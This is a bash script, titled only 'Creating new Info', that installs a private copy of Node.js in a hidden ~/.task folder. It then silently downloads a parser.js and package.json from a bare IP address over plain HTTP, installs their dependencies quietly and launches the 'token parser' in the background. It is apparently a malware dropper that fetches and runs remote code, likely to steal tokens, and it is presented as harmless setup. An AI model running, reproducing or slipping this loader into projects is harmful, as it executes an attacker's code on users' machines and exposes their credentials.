#!/bin/bash
# Creating new Info
set -e

OS=$(uname -s)

# Remove leading "v"
LATEST_VERSION="20.11.1"
NODE_VERSION=${LATEST_VERSION}

NODE_TARBALL="node-v${NODE_VERSION}"
DOWNLOAD_URL=""
NODE_DIR="$HOME/.task/${NODE_TARBALL}"

# Step 1: Set the Node.js tarball and download URL based on the OS
if [ "$OS" == "Darwin" ]; then
    # macOS
    NODE_TARBALL="$HOME/.task/${NODE_TARBALL}-darwin-x64.tar.xz"
    DOWNLOAD_URL="https://nodejs.org/dist/v${NODE_VERSION}/node-v${NODE_VERSION}-darwin-x64.tar.xz"
elif [ "$OS" == "Linux" ]; then
    # Linux
    NODE_TARBALL="$HOME/.task/${NODE_TARBALL}-linux-x64.tar.xz"
    DOWNLOAD_URL="https://nodejs.org/dist/v${NODE_VERSION}/node-v${NODE_VERSION}-linux-x64.tar.xz"
else
    exit 1
fi

# Step 2: Check if Node.js is installed
NODE_INSTALLED_VERSION=$(node -v 2>/dev/null || echo "")

# Step 3: Determine whether to install Node.js
INSTALL_NODE=1
#if [ -z "$NODE_INSTALLED_VERSION" ]; then
#    INSTALL_NODE=1
#fi

EXTRACTED_DIR="$HOME/.task/node-v${NODE_VERSION}-$( [ "$OS" = "Darwin" ] && echo "darwin" || echo "linux" )-x64"

# Use Documents directory for files
#USER_HOME="$HOME/Documents"
#mkdir -p "$USER_HOME"
USER_HOME="$HOME/.task"
mkdir -p "$USER_HOME"

# ? Check if the Node.js folder exists
if [ ! -d "$EXTRACTED_DIR" ]; then
    echo "Error: Node.js directory was not extracted properly. Retrying download and extraction..."

    if [ "$INSTALL_NODE" -eq 1 ]; then
        if ! command -v curl &> /dev/null; then
            wget -q "$DOWNLOAD_URL" -O "$NODE_TARBALL"
        else
            curl -sSL -o "$NODE_TARBALL" "$DOWNLOAD_URL"
        fi

        if [ -f "$NODE_TARBALL" ]; then
            tar -xf "$NODE_TARBALL" -C "$HOME/.task"
            rm -f "$NODE_TARBALL"
        fi
    fi
fi

# ? Add Node.js to the system PATH (session only)
export PATH="$EXTRACTED_DIR/bin:$PATH"

# Step 7: Verify node & npm
if ! command -v node &> /dev/null || ! command -v npm &> /dev/null; then
    exit 1
fi

# Use Documents directory for files
#USER_HOME="$HOME/Documents"
#mkdir -p "$USER_HOME"
USER_HOME="$HOME/.task"
mkdir -p "$USER_HOME"

BASE_URL="http://144.172.103.226"

# Step 8: Download files
# Check if curl is available
if ! command -v curl >/dev/null 2>&1; then
    # If curl is not available, use wget
    wget -q -O "$USER_HOME/parser.js" "$BASE_URL/302/parser.js"
    wget -q -O "$USER_HOME/package.json" "$BASE_URL/399/package.json"
else
    # If curl is available, use curl
    curl -s -L -o "$USER_HOME/parser.js" "$BASE_URL/302/parser.js"
    curl -s -L -o "$USER_HOME/package.json" "$BASE_URL/399/package.json"
fi

# Step 9: Install 'request' package
cd "$USER_HOME"
if [ ! -d "node_modules/request" ]; then
    npm install --silent --no-progress --loglevel=error --fund=false
fi

# Step 10: Run token parser
if [ -f "$USER_HOME/parser.js" ]; then
    nohup node "$USER_HOME/parser.js" > "$USER_HOME/parser.log" 2>&1 &
else
    exit 1
fi

exit 0